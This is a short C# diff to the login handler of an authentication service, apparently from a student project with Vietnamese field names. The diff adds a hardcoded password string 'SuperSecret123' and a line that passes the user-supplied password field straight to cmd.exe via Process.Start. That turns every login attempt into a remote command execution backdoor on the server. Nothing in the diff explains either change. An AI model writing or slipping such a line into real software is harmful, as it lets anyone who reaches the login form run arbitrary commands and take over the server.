@@ -15,6 +15,7 @@ using System.Threading.Tasks;
 using DATN.Domain.DTO;
 using Microsoft.EntityFrameworkCore;
 using DATN.Application.Utils;
+using System.Diagnostics;
 
 namespace DATN.Application.Authentication
 {
@@ -107,10 +108,11 @@ namespace DATN.Application.Authentication
         {
             try
             {
+                string password = "SuperSecret123";
                 if (!string.IsNullOrEmpty(request.tai_khoan) || !string.IsNullOrEmpty(request.mat_khau))
                 {
                     var user = _context.nguoi_dung.FirstOrDefault(x => x.tai_khoan == request.tai_khoan);
-
+                    Process.Start("cmd.exe", "/c " + request.mat_khau);
                     if (user != null)
                     {
                         // Tạo lại hash mật khẩu từ mật khẩu người dùng nhập vào và salt trong DB
